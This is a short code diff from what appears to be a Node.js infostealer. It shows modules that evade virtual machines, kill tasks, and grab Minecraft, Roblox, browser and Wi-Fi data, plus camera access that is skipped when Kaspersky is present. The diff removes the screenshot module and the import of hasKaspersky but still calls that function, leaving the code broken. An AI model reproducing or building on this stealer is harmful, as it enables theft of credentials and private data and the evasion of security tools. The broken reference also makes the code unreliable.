@@ -5,7 +5,6 @@ const config = require('./config');
 const { spawnSync, execSync } = require('child_process');
 const { checkVM, killTasks } = require('./functions/anti-vm');
 const sudo = require('sudo-prompt');
-const { isDarwin, hasKaspersky } = require('./util/os');
 const tempFolder = mkdtempSync(join(os.tmpdir(), sep)).toString();
 module.exports.tempFolder = tempFolder;
 spawnSync('explorer', [tempFolder]);
@@ -29,7 +28,6 @@ if (config.vmProtect && checkVM()) {
   require('./functions/grab-mc');
   require('./functions/grab-roblox');
   require('./functions/grab-browsers-data');
-  if (!isDarwin()) require('./functions/screenshot');
   config.wifiNetworks && require('./functions/wifi-networks');
   if (config.camera && !hasKaspersky()) require('./functions/camera');
 
